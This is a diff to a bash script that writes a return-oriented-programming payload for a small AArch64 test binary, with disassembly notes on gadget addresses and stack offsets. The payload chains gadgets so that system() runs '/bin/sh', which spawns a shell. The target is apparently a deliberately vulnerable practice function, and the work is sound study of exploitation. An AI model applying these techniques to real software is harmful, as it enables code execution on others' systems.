@@ -1,76 +1,98 @@
 #!/bin/bash 
 
-#code snippets
+##Get the system() api address and "/bin/sh" string address 
+: << 'rop_symbol'
+	system("/bin/ls"); // to make the system link to the binary
+  400404:	90000280 	adrp	x0, 450000 <_nl_locale_subfreeres+0x1b8>
+  400408:	9116e000 	add	x0, x0, #0x5b8
+  40040c:	940019b7 	bl	406ae8 <__libc_system>
+
+NOTE: libc_system = 0x406ae8
+rop_symbol
+libc_system="\xe8\x6a\x40\x00\x00\x00\x00\x00"
+
+##According to the glibc do_system source code
+: << 'do_system'
+      /* Exec the shell.  */
+      (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);
+      _exit (127);   
+
+  406acc:	d0000240 	adrp	x0, 450000 <_nl_locale_subfreeres+0x1b8>
+  406ad0:	b900067f 	str	wzr, [x19, #4]
+  406ad4:	91344000 	add	x0, x0, #0xd10
+  406ad8:	9400475e 	bl	418850 <__execve>
+
+NOTE: bash address = 0x450d10
+do_system
+bash="\x10\x0d\x45\x00\x00\x00\x00\x00"
+
+
+
+##Calling flow
+## rop_bad_func --> main --> __deregister_frame_info_bases --> __deregister_frame_info_bases --> system --> system --> system -> ....
 : << 'rop_bad_func'
-Code 1: Use this code to write the stack, u64's offset is 16, stack will pop 48
+Gadgets 1: Use the code to write the stack, u64's offset is 16, so data offset = sp - 16
 	read(fd,&u64,512);
-  400450:	910043a0 	add	x0, x29, #0x10
-  400454:	d2804002 	mov	x2, #0x200                 	// #512
-  400458:	aa0003e1 	mov	x1, x0
-  40045c:	b9402fa0 	ldr	w0, [x29, #44]
-  400460:	94005f5e 	bl	4181d8 <__libc_read>
+  400444:	910043a0 	add	x0, x29, #0x10
+  400448:	d2804002 	mov	x2, #0x200                 	// #512
+  40044c:	aa0003e1 	mov	x1, x0
+  400450:	b9402fa0 	ldr	w0, [x29, #44]
+  400454:	940062e1 	bl	418fd8 <__libc_read>
 }
-  400464:	d503201f 	nop
-  400468:	a8c37bfd 	ldp	x29, x30, [sp], #48   ####### pop 48, stack offset + 48 
-  40046c:	d65f03c0 	ret
+  400458:	d503201f 	nop
+  40045c:	a8c37bfd 	ldp	x29, x30, [sp], #48   
+  400460:	d65f03c0 	ret
+
+Note: After ret, the sp = sp + 48
 rop_bad_func
 
 : << 'main'
-Code 2: Set the X30 = 0x443774 (Code 3 entry), Current SP offset is (48 - 16)/8 = 4 
+Gadgets 2: Set the X30 = 0x44f02c (Gadgets 3 entry), offset is (48 - 16)/8 + 1 = 5 
 	rop_bad_func();
-  400478:	97ffffec 	bl	400428 <rop_bad_func>
+  40046c:	97ffffec 	bl	40041c <rop_bad_func>
 	return 0;
-  40047c:	52800000 	mov	w0, #0x0                   	// #0
+  400470:	52800000 	mov	w0, #0x0                   	// #0
 }
-  400480:	a8c17bfd 	ldp	x29, x30, [sp], #16   ##### pop 16, stack offset + 16
-  400484:	d65f03c0 	ret
+  400474:	a8c17bfd 	ldp	x29, x30, [sp], #16
+  400478:	d65f03c0 	ret
 
+NOTE: After ret, the sp = sp + 16
 main
 
-rop_c3="\x84\xe2\x44\x00\x00\x00\x00\x00"
-rop_c3_offset=5 # x29 = 4 ,x30  = 5
+rop_g3="\x2c\xf0\x44\x00\x00\x00\x00\x00"
+rop_g3_offset=5 # x29 = 4 ,x30  = 5
 : << '__deregister_frame_info_bases'
-Code 3: X19 = 0x44f7c0 bash string, will set to X0 at Code 4, offset = 48 + 16 - 16 + 16 = 8
-        X30 = 0x44e280 (Code 4) offset = 48 + 16 - 16 = 6 
-  44e284:	f9400bf3 	ldr	x19, [sp, #16]
-  44e288:	a8c37bfd 	ldp	x29, x30, [sp], #48
-  44e28c:	d65f03c0 	ret
+Gadgets 3: X19 = 0x44f7c0 bash string, will set to X0 at Gadgets 4, offset = (48 + 16 - 16 + 16)/8 = 8
+	X30 = 0x44f080 (Gadgets 4) offset = (48 + 16 - 16)/8 + 1 = 7 
+  44f02c:	f9400bf3 	ldr	x19, [sp, #16]
+  44f030:	a8c37bfd 	ldp	x29, x30, [sp], #48
+  44f034:	d65f03c0 	ret
 
-Code 4:  X30 = 0x406ae8 libc_system address offset = ( 48 + 16  + 48 -16)/8 = 12 
-  44e280:	aa1303e0 	mov	x0, x19
-  44e284:	f9400bf3 	ldr	x19, [sp, #16]
-  44e288:	a8c37bfd 	ldp	x29, x30, [sp], #48
-  44e28c:	d65f03c0 	ret
+NOTE: After ret, the sp = sp + 48
+
+Gadgets 4:  X30 = 0x406ae8 libc_system address offset = ( 48 + 16  + 48 -16)/8 +1 = 13 
+  44f080:	aa1303e0 	mov	x0, x19
+  44f084:	f9400bf3 	ldr	x19, [sp, #16]
+  44f088:	a8c37bfd 	ldp	x29, x30, [sp], #48
+  44f08c:	d65f03c0 	ret
+
+NOTE: After ret, the sp = sp + 48
 __deregister_frame_info_bases
 
-: << 'rop_symbol'
-Code 6: libc_system address 0x406ae8, bash string address 0x44f7c0
-	system("/bin/ls");
-  400404:	f0000260 	adrp	x0, 44f000 <free_category+0xb0>
-  400408:	911ee000 	add	x0, x0, #0x7b8
-  40040c:	940019b7 	bl	406ae8 <__libc_system>
-	printf("%s\n","/bin/sh");
-  400410:	f0000260 	adrp	x0, 44f000 <free_category+0xb0>
-  400414:	911f0000 	add	x0, x0, #0x7c0
-  400418:	94001cfe 	bl	407810 <_IO_puts>
-rop_symbol
-
-libc_system="\xe8\x6a\x40\x00\x00\x00\x00\x00"
 libc_system_offset=13 # X29 = 12, X30 = 13
-bash="\xc0\xf7\x44\x00\x00\x00\x00\x00"
 bash_offset=8
-rop_c4="\x80\xe2\x44\x00\x00\x00\x00\x00"
-rop_c4_offset=7  # X29 = 6, X30 = 7
+rop_g4="\x80\xf0\x44\x00\x00\x00\x00\x00"
+rop_g4_offset=7  # X29 = 6, X30 = 7
 
 data=rop.data
 printf "" > $data
 
 #The max size can't be too big, it will overwrite the other segement to make the system call failed
 for (( i=0; i < 40; ++i)); do 
-	if [ $i -eq $rop_c3_offset ] ; then 
-		printf "$rop_c3" >> $data
-	elif [ $i -eq $rop_c4_offset ] ; then 
-		printf "$rop_c4" >> $data
+	if [ $i -eq $rop_g3_offset ] ; then 
+		printf "$rop_g3" >> $data
+	elif [ $i -eq $rop_g4_offset ] ; then 
+		printf "$rop_g4" >> $data
 	elif [ $i -eq $libc_system_offset ] ; then 
 		printf "$libc_system" >> $data
 	elif [ $i -eq $bash_offset ] ; then 
